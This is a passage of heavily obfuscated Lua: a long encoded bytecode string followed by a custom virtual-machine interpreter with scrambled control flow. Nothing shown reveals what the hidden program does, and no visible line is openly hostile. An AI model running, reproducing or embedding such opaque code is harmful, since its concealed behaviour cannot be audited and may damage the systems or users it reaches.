B*!6Q_BH1P&\"jdE`,R*rEA1RnO\"s*r\"\"U,p&#*]8nA=Nf,E+GaJ\"fMW9X9Ad+\"!+lRZipOQ\"nDa!AAeQRa9?+u!sO2YACL\\bkQ2e/\\cDsTa9I;#\"([>n\"c*7kPQV0R\"Wdj4!<m#H\"U4Z)AAeWTp]P-O\"U0D\\*X-inA:t$g\\-?K&!sQaKA<[0\"QiU`f!sSH(A>B;2TE\\r.!sP>#A@)FBhuRB$!sLA\"\"gS46*N0$]\"(Zc_G[uI.\"n2S(Mua*T!ZhO)\"pJNo\"jd9\"\"Zus!6j:p>A5!/W!b>76fEGej\"dfC&A-M0$A8DD\\*X17#\"_?Bi\"n2V)j8oL@\"D$j#\"jdAm^]O-0\"(_<2\"m>t.\"d/ul$P\\['*$(CN*!7k(!?<'e'^u5F*X0sn\"_>OP\"jd<]bQ.m7\"_?*`\"^klr!<p7>AE3apn,XQF#4)?mAFom+YQGpM$3at)!<qB_A=NZ(QinFs#,D8%A?5e8^]\\2T!<qB`A@qpHcitNpU':cA..dWEAGcQ6TESkZ\"U3feA;gZqJ--hrJcc0ePQD#E\"_=,)\"\\<1\"!X54tA?5h9p]4p4!X4)T*=0:Z\"!.Uq\"Wdh>\"[!Oe(%hc=!!*)MVZRtDU&kK>\"el&%?NiQD\"<I_-\"U(J\"1d!/<\"[\"mg\"VLtAfEF)o-eJSb4<=ZX\"9hDg*Mj\\)\";`%G6n:A^6oP8Q4AiTi/3HR]\"?\\ds4>]/JW!\"A6*X,^N'A*I6g&iB\"_?0s1,hN8_#!<M%*X*_kA4-U2\"?Zhk1eXJC1c-6WiW03P\"Z/%LfEEhs\"!.WW!sJZ4\"Y;>21_aI_\"crq!6j9dr*X2BA\"TSW.$j[7F\"TSW.'HRFH!sL@^//2VO\"eYp-49aXF+=%+:\"RlR?,Sq^7,T[-c!<jSs\"XO-V\"Z.n:4;8h?_>sfG'EnYN*!Mu:!\"/rU*X0C^\"Wdi9!<iVY\"Z/>#\"U.\"0\"f_S,A1RnW!b<8SfEE<\"EWm+Y/92d8dK9Y3\"U.!q!!4/YTr.u6\"Yp6&\"Yp62`?4Ib`<%J6'H@Q%*\"4b0\"WS*X'a6u/\"WRLE\"XGNB$lf6T\"XG,m)?h/c1'Ij^!WiS'VZRM7'a68C\"Ul@[*#oXs*&7[=\"[WAFN=<c?N>j>N,R$+1\"XG,m@Kd8G\"Y:)k//1#H\"Y;8G\"!djS\"Y:Sp/0\"X'\"Y;>21aF+G8d,J#\"'fT'!O&C'*X,.>*X,.>5m7Dp5Qq;p!$_Xm=TnsS*X*/[%b2/N#_`F(\"gS.S<<Wg86j3`6;^;MM'c[A\\!!<BM!\"/r]!##Mm;`k3e2$GN7A2FI_!ZhM3\"TTJF6oP8Q6s:kQ!<jMJ)?gQi6p(V]7'Zh7\"el#$$316Q/WKjp!Ekni\"!.Ui\"Wdgk\"Wdgk\"VKhteHD-T&I#iP\"[6A5\"pHph\"iLU[!!*/oVZRtDiWKE+\"l]Xg0Ei^9*X.u9\"Y2Dd,ZZb;\">ih01b]sSRK3Ql,6]>H\"Y:>f.g7aN\"_%XG49_AZ+=%+:!&Fd0!':?@*X*_kA4-To!ZqTW!AlJ6,W#Kg\"Z.bm\"V`!]M?*la2!P/H*X.]/\"Utl.49-l89G]fb9HFA3!X0$$>Z<-d9O&K@<-&L:>[.8U\"_9&m9O&VBaoV_U$qs=p6NpF*4B,8h$rg1I\"mQ*l=sV5k\"Wdi!!sM-t'I4_'RKWip@g++]'I;B6*X*/[5Qq;p5m7Dp5Qq;p0Ei.A*X1g4\"Zuql<\"r:W<#S_89-dIf/-%a8<%CpI,Z[m[\"B6EGM?F(_,6_%#\"^D`q\"_::J\"f_Y.!)j&+?<gH/0Ei_$*X0+U\"TVa1,R#/5l3/44iWTKi\"U,kG'*TWb*$hNf*X.]1\"VCnI\"TSW.'FbHb'EALE*&%OA'HRFp\"9fhMaoqr&\"V`4'\"mQ6p!#l(e\"WSef\"<I_5\"W$2@`>Qo?/JKH60Ei.9*X1g4\"Wdj4!X/QS\"XGWM\"UkBH\"Z.;)aoWh!!\"^JSaoZH$G1ltF?:i!8c2uDqM?.R/\\#0<L\"d/li*X.]-\"Wdi1!<kaM$KV?F&HG0%6rHE84:*;;,R4_]\"TT2>$iip('LW*.*$,8u\"Zceq\"TVI),\\/G0(bu7H$igY=$m#R]\"TSo6$oA%p\"TT2>$ih4M'HRFh!<iH:\"WRLe\"XF'u\"Y9X0\"Z.8(iW03Yhubem+<1P2!##M]!$_Xu!':?@!&Fd@*X*_k$31H7<=LZO>$bZM3@53aq.[V`lgI'(29h<O9^Y+Zj#/d-$0XSRo3bU?(mmP[9(e=@&(j)R/f)n*S(0`Gl)%bmZfaP9b1Zjo&)SFqAL&5[L*/=f(i7?!f4g%][K=]#Y&O\"7)B):YTaI4B\"!jHNs8W-!s8W+jmf*7ds8W-!T)\\ijs8W-!s.3j&s8W-!s8SZos8W-!s8W+jS+-IXs8W-!T%!`>s8W-!s.6Xus8W-!s8S#\\k(\\d*Sll!ls8W-!s.9/gs8W-!s8S\\=s8W-!s8W+jP5kR^s8W-!N!,5,7Uhs<s8W-!s8W+jF:8-LzSr!CGs8W-!s.39js8W-!s8SYqs8W-!s8W+j>'Ca?\"/ki?T(i9bs8W-!s.3.jz!!&Ves8W-!s8W+X'`kWDp?jhTcn,hKgn<QsW2d3=,]]KsHAn]?MIlO/z!!!_KSrE^Ls8W-!s,70h]1VN$7jO\\gs8W-!s8W+j8H8_is8W-!Sm26ps8W-!s.3@9z!!&VXs8W-!s8W+jYlFb's8W-!T%!]=s8W-!s.5JSs8W-!s8S\\Ts8W-!s8W+GzzT%<o@s8W-!s.80Js8W-!s8SZZPU-/!T&UQW+asCkzT#^m2s8W-!s.6%ds8W-!s8S[8s8W-!s8W+j;ZHdss8W-!Sj*2Ss8W-!s.4]Lz!!&Ums8W-!s8W+X#ai`(8?>.CAtJ3/z!!&U=huE`Vs8W+joDejjs8W-!T$.-5s8W-!s.8'3s8W-!s8S[#rr<#us8W+X#&o:.ctAuB*rl9?s8W-!T)8Qfs8W-!s.4lBs8W-!s8S\\Nrr<#us8W+X#@``rHjh/uT!A=qs8W-!s,7CS/HP6l/m>JnjB`FTSpgV<s8W-!s,7/d96$.O9V1AGs8W-!s8S\\=GlRgE!!!\"jCB+>6s8W-!N!rPlFIZ62>fbWr5lR?qs8W-!s8W+X#blJEq].3)jdtQ5s8W-!s8S[Is8W-!s8W+j;?-[rs8W-!T'0_cz!1nkBs8W-!s8S\\Ls8W-!s8W+j;ucmts8W-!T$dT<s8W-!s,76#nh1qF?f2'G\"\\LuFlT(QBs8W-!s8W+jQN.!bs8W-!T\"+h#s8W-!s.58Ns8W-!s8S['s8W-!s8W+jD>sS8s8W-!T%F#Bs8W-!s.8NUs8W-!s8S[Ms8W-!s8W+jirB&Ys8W-!N!/Dk%$@,6pAb0ms8W+X%@Xl[K9;ZB')[DB;h:OrZ2ak(s8W+jHiO-Gs8W-!N\".&ZO)9HVH#.'6q`25GHN4$G!!%i(^l/FuATORDT(W-`s8W-!s.0r)s8W-!s8SZ4s8W-!s8W+jT)\\ijs8W-!T`CZhoDejjs8W+jeGoRKs8W-!T#q!3s8W-!s.89Ns8W-!s8S[Wrr<#us8W+X#KIutmVlS+T#L^/s8W-!s*N#7bfn;T#f*$2s8W-!s8W+jPQ1[_s8W-!T$[N;s8W-!s*F_Gz(r2`-W;lnts8W+jgAh3Qs8W-!SsB?Us8W-!s,7Kf1D=GuTp@%_^\\`Q*](hjrrr<#us8W+j=8r7\"s8W-!St#`Zs8W-!s.3?e^uYOqs8S\\is8W-!s8W+jX8i5\"s8W-!Sqm=Fs8W-!s.5tbs8W-!s8S[Qrr<#us8W+j^&S-4s8W-!SuVhjs8W-!s.6\"cs8W-!s8SZSV+kJ#!!!\"jT`>&ls8W-!T%j;Fs8W-!s.8TWs8W-!s8SZ8:&k7o!!!\"jDZ9\\9s8W-!Se(l$s8W-!s.6_\"s8W-!s8S\\8s8W-!s8W+jnc/Xhs8W-!Soar3s8W-!s.0Ans8W-!s8SZ,s8W-!s8W+j[<;NMzSrj!Ps8W-!s.8ZYs8W-!s8SbnSn%g#s8W-!s,7K8ap^,Grq';i\\1t@o4Udo$M?!VUs8W+j\\,QF-s8W-!ScA`jz!1ph%s8W-!s8SZ-RfEEfs8W+j:p/-B/MG7CT&9SJs8W-!s,7D+VRjf^J-Al86WHq*St?)bz!1m[!s8W-!s8S\\-s8W-!s8W+j./K[R!*75`T()d[s8W-!s,7,oS-XLsMulr=T(N'_s8W-!s,7$FhO`9ss8W-!s8S\\hs8W-!s8W+jf)PdMs8W-!Si-QJs8W-!s.7=3s8W-!s8S#ZM0b+)TWHAE,+i5rXG5^dZ6J\\jM.``r88N+p_E5FR/\"s-lfD;)ps8W-!s8W+jR/[-cs8W-!Mupl_T(<Wrz!/q9$_aQ.7Ga8fDH_/F\\s8W-!s8S#_JI%fTAt\\7E\",9+dSr*IHs8W-!s.3d4z!!&U?s8W-!s8W+jPlLd`s8W-!T'-.Rs8W-!s.4U>z!!&VVrr<#us8W+jAcMf1s8W-!Sp5Jeec5[Ls,7/s$9mk+`L_8Ps8W-!s8SZ=LB%;Rs8W+jDZBb:s8W-!T&BYKs8W-!s.4Z=s8W-!s8S\\drr<#us8W+jb5VG@s8W-!Sl,(Ys8W-!s.4Q:s8W-!s8S[as8W-!s8W+jV>pSqs8W-!T)&Eds8W-!s.8$Gs8W-!s8S[+rr<#us8W+jpAb0ms8W-!T'u^Zs8W-!s.8,!s8W-!s8S[9s8W-!s8W+jXu9X1U(ggET!SIss8W-!s,7-=[)s*RT%s>Fs8W-!s.1b@s8W-!s8S#c`/oC553<_>ao:q(O8o7[s8W-!Si6WKs8W-!s.8`Zs8W-!s8S[mrr<#us8W+j`W,u<s8W-!Sd,5ps8W-!s,7-V&8e'ISkK+`s8W-!s.8HSs8W-!s8S\\5s8W-!s8W+j'EA+4s8W-!SsKBUs8W-!s.5b\\s8W-!s8S[ts8W-!s8W+jci=%Fs8W-!SkB%_s8W-!s.6+YBts4p&AXmc#ljr*!!!\"j1]RLTs8W-!T&TbLs8W-!s*F_G!!!\"T_n_jkrr<#us8W+j(uPAns8W-!SlD<eEa%,4BqG,!s8W-!s8S\\Xrr<#us8W+jli7\"bs8W-!T$IB9s8W-!s.8]Ys8W-!s8S\\1s8W-!s8W+j8cShjs8W-!SlYdhs8W-!s.5eYs8W-!s8SYks8W-!s8W+j]`8$3s8W-!T\"+e\"s8W-!s1q1CVZRtD@KdeV@KdeV)?j1n\"U-k:L^i8G0EhR^+pA-$3%W\\hVu\\@O/-WB]\"_%X,KbW&TjTZb0@KdeVC'@Zi\"U-k:kQ/1'4Y-a?3%UF,(fr6l\"ZS'#%bM(A\"U\"rP\"U-G:/>rZL!\\+@)\"XO6SZiO\\O\"ip_]!?;9q%ito.!<jMJiW03n49^NO<]l`O4?YM)\"Ud0F$9TI8\"9]nP\"Z/1qa9;8H.KqX4*X/PF\"],@+/3#1g=B@$W\"ZS&`\"gACh\"U+2s+pA-$3%ViN3%>(_\"_=\\8\"o&F:$j@qC\"U,#7!!3?7c_ppe\"d/rk*X.]/\"Wdi1!sK_L+pDLn\"Y`tncjOYd\"U/EEA;C;'+U%uO8d,B/3+Q.,$7Z3i\"Wdh^\"]nq4\"ZTbc&%E)m\"U\"rP\"U/-j>c7a\\!\\0`A>Ql.(%La$F!>G^I%M&^H$m#SH!X1)#]bZSI*X0[e\"]nq4\"ZTbC$fDF;\"U/-j>_ib)0EhR^+pA-T3*bYTp^&DR>Qm4n\"Um$foF%Z)*X.E'\"WdiI!X2Y1\"U-kjTEj*U='Pn43*aN7hut8-\"9]nP\"^F#l^^)nL\"^D32!sK*D'EtEER/m[!*7k2p_>sf]\"W@OE!sK*D'EsR/!\"/rM0a.sh*X/8>\"Wdia!sML)\"^F#lO9/Nc>Qk9j>j)I'%Tcm=\"ZTbS\"iq0:>Qk9j>X6pK:^%#-3*a6/=?Tmm\"ZTc^\"5!r(\"U\"rP\"U/-j>jr*!\"Y'[\\\"m5nC\"gA:g\"XP,g!sR0UA?5n;TF)hG//6>0\"WR[G,6d]?ACM(mQj*O@\"Y:\\uiX#c0\"e#SuA8DFr%p!M&$>`<<\"_8!Oi!X?T\"U\"rP\"U/ErA;C?O$n;Ek\"Wdj,\"U.t4\"U-kjQj8-F='Pn43*`*_\\.2==\"^F#lYQaM$+pA-T3*^.d$s-[;\"ZTc>%CcmL>Qk9j>hB54#quMc\"<n!Q>W?!H!oOG9\"dKK\";7HrA4Ai$^X9Uju6j9drC.nfP#*/da\"ipljPR@Xh%0HbRA0_?\"![.^u'HRFh!sK_L\\d&C%>Qk9j>dt2E='Pn43*^^<%T!<4>W>u5fEs;9\"9]nP\"^F#lcihu/.Ks&\\5dU[un-K(&\"k3iRa9i>,*X2*A\"WdiQ#R+:7\"U-kj+Ku5T>Qk9j>_!78#uCd/>W>ue\"B\\`1\"U-kj\\-8f3+U%uO+pA-T3*b)EW!k-Z>Qk*0\"UnoU\"kX:b!sKZTe-cGQ!F#^2)upo],io%9\"XO!H\"UkQZ!sKA[\"gS@:*X1g8\"_;EQTEA52J-'OgA-E,EA<7%4+U%uO+pA-\\3+TN*p]2iJA-F\"XZ3gb:>Qk9j>keHC%PS%h\"A/h$>W>t:O9]_.>QsEo\"WR\\3\"U,#M\"o8Q0:^%#-3*bqRfE52[\"U-kjn,]0f0EhR^8d,B'3*b)=a:Ba(>Qlj8#LEK&:7)Ct1f9&61c-6WOp)\"!!!Wc?&f)Ae_l!SX\"X4*k\"X4*k\"X4*k\"l]Od*X+\"s+pA,q3$bF)(bc*r\"<n!Q,WI(%\"/lDR\"XF6`\"UtWB\"ge_b*X*Gc\"-iu-\"Q^.8\"bHaY4X:173$cQJfEk.R\"XH&QkQ0<C+U%uO8d,AD3$bF0QjtSL,R\"/U\"Va-4N!KRt\"U,T+\"U1t8*X1g0\"_9Fna9bm(QjGTN/-Q1b/B@uO0EhR^8d,AL3%X7t^^)Cn/-R'uZ2t1m,R\"?2,WP8u_uU#E\"<n!Q,WI'Z#M951\"XF6O!sS#q=TnsC5m7E+#64uX&J[;-,r*69\"!.W'\"pH%OM?X5*\"W@PGquHs)3;`f5%H%C5\"U\"rP\"U4f)3;`g0$E*tT\"oJB)mf<TL\"pG@&&tAt+*X-!VA;gQnQjm)T!mh\"-!^22<\"U,9e!ltM'!b@5k\"m?7nMuqo?Muk1,\"bZpbKEB3tMuk[:\"9_=#\"bZq:KEAprQjtSLKE;;u\"j-iL=8W(&\"ZZD\\YRKFn0En!JN=/>^\"oJB\\quQ!hn,t3EquHs1\"nE$)?Nl)`dL.*\"Z2t1`\"bZn]*KUD_!<ZO0\"bZmt\"bHdZ*X0[f\"^t<A!U'b0\"nE!(*X0sn\"_<Pn\"m?(iMurJVMuk1,\"bZpbKE@eVMuk.+\"9_=#\"bZq:KEC'=YR`2eKE;;u\"e#Ms=8W(&\"ZZD\\^^o?,0Em.;\"<n!QquJeT!UpBI!\\+BO!<o_/\"c<]l*X17\"\"_<Pn\"jdHSMunM1Mum(6!X/`8KEC?CMuk.+\"9]nP\"bZq:KECoXQj>/FKE;;u\"el,'+pA/J!BBuXYRT4l+pA/J!BBuXQj)+L63RJp+pA/J!BBuXkRYH=.L#_N\"YYB/S.6etJ-n[q*KUC\\\"!.WO#6c7SMuao&\"U0P[?Nl)`dL.*\"JdDT%\"f__0=8W(&\"ZZD\\\\-S`4=8W(&\"ZZD\\L^<2Q+U%uO8d,Cr!BBuXp]m`'.L#_N\"i(-B\"`upGHj'l]KE5=!\"bHm]*X.]2\"_<Pn\"h4Y8MuoX[Mum(6!X/`8KE>hG!\\ac\\\"<n!QKE=,d!l,#5\"Y'\\/!X0VKg'.^Q\"U4f)3;`g0!Up=/\"U\"rP\"U4f)3;`fm#M9J8\"oJB)!sJi3*Jb16\"!+lZr!3BF^]YVZ*X0so\"WdiY#6d9g!<iWdquM<SVup-!!<iWdquO;1kQY,d!<iWdquQ!_kQX3J!<iWdquPFY\\,f\\/!<iWdquNH\"kQW16\"9_=#\"oJB\\quP.IL^#=4quHsSL]oWr\"Mb&R#s8;]O:4MZ:<3Y[9HAWk<!+09\"^D.)cj^t*08L)XljHk8\"*=WUHj0!A*X/8A\"Wdi1!X0VKOpM:nquHs)3;`f-%(HdD\"U4f)3;`f-%&aIU\"U\"s#\"U4f)3;`fU$m7#'quHs3g]n\"e#p'9@$O%RTl3RW)Muj1P\"]gQ`i!t\\I4bNk?\"Uftbn,eOM+U%uO+pA.'!]Yi7\\-_p2.KtJ,\"WdiQ$3a60\"oJB\\quQQqp]r#H\"9]nP\"oJB\\quJ4-#:]oT!<inE\"U,&q\"U2\"9*X2BI\"]tU&\"U-m`!RM=L#;?;a\"<n!QquJeT!S@O:%OqY[!<k7__uY6g\"U2gFA<[)uYR)?SapS@o\"nE$)0Em+1Hs$UVKE4@B\"bZmnh$!Z\\V$K<i\"U,*p!TF^q*X0t*\"Wdi1$jB`1!<iWdquQ!gTEeQr!<iWdquQ!kkR9-K\"9]nP\"oJB\\quQQoi!h.>quHup!<n,W>TLT_Mua$j!<iX[!FH\"`!R_>s\"elk<+U,4R1a*%8!NZ<4_uU%'\"ZuqlZiM3OndbmF\"f`\"8A;gQnJ-K&5!mh43![7dOKE;O7!g!_I!b@5k\"jdZYMunM3Mum(6!X/`8KE@5AMuk[:\"9]nP\"bZq:KEB4(\\-=DdKE;;u\"d0?!+pA/J!BBuXW\"./X4o><a\"ZZD\\W\"/\"l4o><a\"ZZD\\#ab`p\"gnC78d,Cr!BBuXci^KV.L#_N\"Y\\d7j:?nE09?:C!Q5@@\\.,eGj8g;*Je&#+\"c<fo4o><a\"ZZD\\J.CcI8d,Cr!BBuXL^BFO0EhR^+pA/J!BBuXi!>\\N.L#_N\"Y[(eZiQ*o1[G/'!TX8,j8ln'g]94d!Rq/\"!?ME=&Hs3Zq@<a?Muj0e#?HcbYQ9[a4bNk?\"UftbTFZt_+U%uO+pA.'!]Yi7i\"*U3.KtJ,\"Wdia&-Z/5!<iWdquO;<kQX3J!<iWdquI@r%PS%h\"A/h$quJeT!LOD]%4VPZ!<kI(\"2\"X:0;o8c!W3$QYQV<6`=!^jU(%8I\"f`.<+pA/J!BBuXn.+Xi4o><a\"ZZD\\^]LG90EhR^8d,Cr!BBuXp^?9f.L#_N\"XMRu`!=Ke1X#m<!Q5\"C\"U4f5%?(>+!Mf`i_u[LO;B?\"Q!X0VKU(RW%\"U4f)3;`g($E+Ih\"U\"rP\"U4f)3;`fm%CcHh\"oJB)?NmM:q@\"DKM?sG-\"mQ^(4o><a\"ZZD\\i!+u==8W(&\"ZZD\\a:+^H0EhR^+pA/J!BBuXQiaJo.L#_N\"a1'>!IS#R\"nW$@\"l]gl0a4'J\"Wdj,#mD@Rg(OW^\"U4f)3;`gH&#^\"?quHs)3;`gH&\"!]*quHs)3;`g($/bt1\"U\"s#\"U4f)3;`f-#N,n<\"oJB)0EmsIA7VJ:\"o&Qh.?\"<3JcQ%l'*U@S!OrNA#WRbD^^I@P3/dlWYQu9Rl4aC]Mui,GYR\"d(!<pOK*KU]\"!<XJKU]H,L*X0\\'\"Wdi9'a6bu!<iWdquQ9kO:>:h!<iWdquQ9kW!6?$!<iWdquNGlW!6'%\"oJB\\quNGlW!ZW(!<iWdquO#3W!5it\"oJB\\quMleO:>:h!<iWdquMlekQW^E\"9_=#\"oJB\\quQ9ri!1_8quHs/KE:9?/.7+383HeN\\-mrq\"!WC!\\-nN1,_Q36$PWu%!H:Gk!JCuV#$_Oh!K[LB*X1O>\"WdjD('Re;!<iWdquM<RkQY,d!<iWdquMTSkRT?N\"9]nP\"oJB\\quMlba9sI$quHsd\"U0P[:r!3m!<Z)I$B,\"E!=OP]^]BAp*X.]A\"Wdj4(Blu\"!<iWdquM<YO:<lI\"9]nP\"oJB\\quP^XL]f12quHsh\"U0hg3/dl/L^Z8%!Pe`?#WRbDO9Vop3/dm2#-\\@S\"j.M_*X0t/\"[2ba\"U-m`!Pekp!a#:#\"U-m`!Pel;!AFZ[\"A/h$quJeT!LO;J#V$#U!<nto'd_',&-\\R);B?\"A)$OQ0!X55*<f@*Q\"H3C`KE;;\\$\\ST.#E/^-\"U\"rP\"U0P\\3.q?`%DW&q\"bZp\\*X2*P\"X4*RquJeT!K[>D%9NH.\"U-m`!K[?G#$:^'\"U-m`!S@XM#;?;a\"<n!QquJeT!K[Xb.L#_N\"Z$=8!F-!,#4qou>6P1`!NQ6S!V.!0*X0t\"\"X3pI!3<\"\"*X*Gc*X*Gc5m7Dp*X*_k=!RqQ3$a:]fEj\\d\"U-k2L]Z39+pA,q3$cQN(eOr8,WI'J$1J0R\"U\"rP\"U-/2,ZpuP.Kq($!!<B54pfFC\"`+hUg]fJ:X9\\tN\"VLt[\"W@Otm0pZEbo?le\":5f+!X&K'",5));break;end;end;until false;a=(nil);X=(48);repeat if not(X<=0x1.8p5)then if X==0x1.88p6 then break;else a=(function(c)j=c;f=1;end);if not(not Z[0X32b0])then X=(Z[0x32b0]);else X=71+((_[7]~Z[4437])+Z[0X31eB]+Z[0X015e3]<=Z[5603]and Z[0X15e3]or Z[4616]);(Z)[0X32B0]=X;end;end;else if not Z[0X1E4e]then(Z)[4437]=(-3+((Z[16018]|_[0X9])&X|_[0X6]>Z[0x31Eb]and Z[0X15E3]or _[0X3]));X=(-31406949698+((Z[0X6660]+Z[26175]<<Z[0X5aDB])+_[1]~Z[0X527e]));Z[7758]=(X);else X=Z[7758];end;end;until false;local r;k=(nil);local g,R;X=(126);while true do if X==126.0 then r=function()local c=G(j,f,f);f=f+0X1;return c;end;if not(not Z[9807])then X=Z[0X264f];else X=69+((Z[486]&Z[12779]>_[2]and Z[28564]or Z[5603])>>Z[5603]<<Z[16828]);(Z)[0X264f]=(X);end;elseif X==0X1.14p6 then k=(function()local D,c;goto D;::c::;D,c=H("\x3CI\52",j,f);goto l;::C::;f=(c);goto t;::D::;goto c;::t::;do return D;end;::l::;goto C;end);if not(not Z[24418])then X=(Z[24418]);else X=(-439387751+(((Z[9807]~_[5])+_[0x6]<=Z[0xFb8]and Z[9807]or Z[28794])==_[6]and Z[0X004cc9]or _[0x6]));Z[0X5f62]=X;end;elseif X==96.0 then g=(function()local D,c=H('\60i\56',j,f);f=c;return D;end);if not Z[0X5759]then Z[22756]=(1705603679+((Z[21118]|Z[12301])-_[0X03]-Z[19713]|Z[0x1e6]));X=(-6+(((Z[0X6f94]~Z[0X300d])&_[0X1])<<Z[0X1208]~=_[0x7]and Z[0X264F]or Z[0X31eB]));(Z)[0X5759]=X;else X=(Z[0X5759]);end;elseif X==0x1.f8p5 then R=(function()local c,D=H('<d',j,f);goto i;::G::;do return c;end;::z::;f=(D);goto G;::i::;goto z;end);break;end;end;local D,MO;X=23;repeat if X<0X1.7p4 then MO=function()local c,t=0X0,0x0;repeat local i=G(j,f,f);t=(t|((i&0X7f)<<c));c=c+7;f=(f+0X1);until(i&128)==0;return t;end;break;else if X>0X1.4p3 then D=4503599627370496;if not(not Z[20211])then X=(Z[20211]);else X=-1501+(Z[0X6660]>>Z[0X4591]<<Z[12779]|_[0X1]|Z[24418]);(Z)[0x4EF3]=X;end;end;end;until false;local LO,G,J,i,u=(Y);X=94;repeat if X>0X1.0p6 then G=(nil);if not(not Z[18358])then X=(Z[0X47B6]);else X=(-60+((_[0X1]|Z[0X707A])+Z[22756]>>Z[0X41BC]==_[0X7]and Z[0xDC7]or Z[0X1e6]));(Z)[18358]=(X);end;elseif X<0x1.0P6 then J={};i=function()local c;c=MO();if c>=D then return c-l;end;do return c;end;end;if not(not Z[7069])then X=(Z[0X1B9D]);else(Z)[0X6858]=(0X19+((((_[0X5]>=_[0X8]and Z[0x47b6]or Z[4437])~Z[12301])&Z[23259])>>Z[0X41BC]));X=-0x28+((((Z[0x5aDb]~=Z[0X00dC7]and Z[24418]or Z[0X29aa])<_[0X4]and Z[0X31EB]or _[1])>Z[0X426C]and _[3]or Z[4023])<Z[20211]and Z[22361]or Z[4023]);Z[7069]=(X);end;else if X>37.0 and X<0X1.78p6 then u=(nil);break;end;end;until false;local DO;E=nil;local s,t;X=0XB;repeat if X>0x1.4P6 then if X<=0x1.B8p6 then E=function(...)return(...)[...];end;if not(not Z[0X2B4a])then X=Z[0X2B4A];else X=0X34+(((Z[3527]>Z[0X1E6]and Z[26175]or Z[20439])|Z[28564])>>Z[0X4591]~=Z[24418]and Z[19713]or Z[0X4EF3]);Z[11082]=X;end;else s=(function(...)local c;goto M;::j::;if c~=0x0 then else return c,M;end;do return c,{...};end;::M::;c=L("#",...);goto j;end);if not(not Z[8737])then X=Z[0X2221];else X=(-24+((Z[26208]~Z[0X663f]<=Z[12976]and _[4]or _[0X5])<<Z[26175]~=Z[0X6f94]and Z[4023]or Z[0X15e3]));Z[8737]=X;end;end;else if X~=11.0 then t=(function(m,UO)local c,L,D=m[2],m[0X5],(m[0X3]);local cO,jO,U,OO,x,N=m[0X09],m[10],m[0X1],m[7],m[0X4];N=function(...)local K,I,H,M,iO,e,A,tO,lO,b,CO=h(c),1,0X1,0,(0X1);local S;repeat local F=U[iO];if not(F>=0X32)then if not(F>=25)then if F>=12 then if F<0X012 then if not(F<15)then if F<0x10 then local c=(L[iO]);(K[c])(K[c+0X1]);I=c-1;else if F~=17 then CO=({[0X3]=tO,[0X2]=e,[0x04]=CO,[1]=S});I=(jO[iO]);S=K[I];tO=(K[I+0X1]);e=K[I+0x2];iO=(L[iO]);else local c=({...});for l=1,jO[iO]do K[l]=c[l];end;end;end;else if F<0xD then repeat local w,l=A,(D[iO]);if w then for c,V in p,w do if c>=l then V[3]=(V);V[0X1]=K[c];V[2]=(0X1);(w)[c]=nil;end;end;end;until true;else if F==14 then repeat local V=(A);if not(V)then else for c,l in p,V do if c>=0X1 then(l)[0x3]=(l);l[1]=(K[c]);(l)[2]=(0X1);V[c]=(nil);end;end;end;until true;local c=(D[iO]);return kO(K,c,c+L[iO]-0x2);else(K)[jO[iO]]=K[D[iO]][K[L[iO]]];end;end;end;else if F<0X15 then if not(F>=19)then(K)[jO[iO]]=(K[L[iO]]-K[D[iO]]);else if F==20 then(K)[D[iO]]=(K[L[iO]]~K[jO[iO]]);else if K[jO[iO]]==x[iO]then else iO=(L[iO]);end;end;end;else if F>=23 then if F~=0x18 then(K)[L[iO]]=K[D[iO]]+K[jO[iO]];else if not(K[L[iO]]<K[D[iO]])then iO=(jO[iO]);end;end;else if F==0X16 then(K)[jO[iO]]=h(D[iO]);else local l,V=D[iO],L[iO];local c=K[l];(v)(K,l+0x1,I,V+1,c);end;end;end;end;else if F<6 then if not(F<3)then if not(F>=4)then lO,b=s(...);else if F~=5 then(K)[L[iO]]=(K[jO[iO]]*x[iO]);else if K[D[iO]]==K[jO[iO]]then else iO=(L[iO]);end;end;end;else if F>=1 then if F==2 then K[L[iO]]=b[H];else K[L[iO]]=(K[jO[iO]]/K[D[iO]]);end;else K[L[iO]]=UO[D[iO]];end;end;else if F<9 then if F<7 then if not(not K[D[iO]])then else iO=(jO[iO]);end;else if F~=8 then local c=D[iO];K[c](kO(K,c+1,I));I=(c-1);else I=D[iO];K[I]=K[I]();end;end;else if F>=0Xa then if F~=0Xb then local c=(jO[iO]);local V,l=S(tO,e);if not(V)then else K[c+1]=(V);K[c+2]=l;iO=D[iO];e=V;end;else(K[D[iO]])[OO[iO]]=(K[L[iO]]);end;else local c,v=L[iO],D[iO];if v==0X000 then else I=(c+v-0X1);end;local l,w,V=jO[iO];if v~=0X1 then w,V=s(K[c](kO(K,c+0X1,I)));else w,V=s(K[c]());end;if l==1 then I=(c-1);else if l==0x0 then w=(w+c-1);I=w;else w=c+l-2;I=(w+1);end;v=0;for l=c,w do v=(v+0x1);(K)[l]=(V[v]);end;end;end;end;end;end;elseif F>=37 then if F>=43 then if F>=0X2E then if not(F>=0X30)then if F==47 then K[L[iO]]=(K[jO[iO]][x[iO]]);else local c=UO[jO[iO]];K[L[iO]]=(c[0X3][c[2]][K[D[iO]]]);end;else if F~=49 then(K)[jO[iO]]=(K[L[iO]]);else local c=(jO[iO]);(K[c])(K[c+0X1],K[c+2]);I=c-0X1;end;end;else if not(F<0X2C)then if F~=45 then(K)[D[iO]]=(#K[L[iO]]);else(K)[jO[iO]]=(not K[D[iO]]);end;else(K)[D[iO]]=K[jO[iO]]*K[L[iO]];end;end;else if not(F<0X28)then if F<41 then K[jO[iO]][K[D[iO]]]=cO[iO];else if F==42 then K[jO[iO]]=nil;else(K[L[iO]])[K[jO[iO]]]=K[D[iO]];end;end;else if F>=0X26 then if F==39 then K[L[iO]]=K[jO[iO]]/x[iO];else(J)[L[iO]]=(K[jO[iO]]);end;else(K)[jO[iO]]=(K[L[iO]]==K[D[iO]]);end;end;end;else if not(F>=31)then if not(F>=0X1c)then if F>=26 then if F~=0X1B then K[D[iO]]=UO[L[iO]][K[jO[iO]]];else local c=(UO[D[iO]]);c[3][c[0X2]][K[L[iO]]]=K[jO[iO]];end;else(K)[jO[iO]]=(K[L[iO]]<K[D[iO]]);end;else if F<0X1d then if not(not(OO[iO]<K[L[iO]]))then else iO=D[iO];end;else if F==0X1e then iO=(jO[iO]);else local c=(UO[L[iO]]);K[jO[iO]]=(c[3][c[0X2]][x[iO]]);end;end;end;else if not(F>=34)then if F<32 then CO=({[3]=tO,[0x2]=e,[0X4]=CO,[0X1]=S});local c=(L[iO]);e=K[c+2]+0;tO=K[c+0X1]+0X000;S=(K[c]-e);iO=(jO[iO]);else if F~=0X21 then local 